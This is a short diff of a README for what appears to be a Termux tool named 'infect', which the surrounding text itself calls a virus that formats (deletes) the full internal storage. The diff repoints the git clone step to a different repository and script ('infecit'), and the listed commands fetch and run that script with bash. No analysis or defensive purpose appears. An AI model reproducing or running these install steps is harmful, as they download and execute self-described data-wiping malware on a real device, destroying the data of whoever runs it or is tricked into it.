@@ -58,12 +58,12 @@ Warning 🚦 This Virus Formates (Deletes) Full Internal Storage So think and Us
 * `pkg install python2 -y`
 * `pkg install git -y`
 * `pip install lolcat`
-* `git clone https://github.com/noob-hackers/infect`
+* `git clone https://github.com/Old-hacker01/infecit`
 * `cd $HOME`
 * `ls`
-* `cd infect`
+* `cd infecit`
 * `ls`
-* `bash infect.sh`
+* `bash infecit.sh`
 ```
 [+]-- Now you need internet connection to continue further process...
 [+]-- You can select any option by clicking on your keyboard
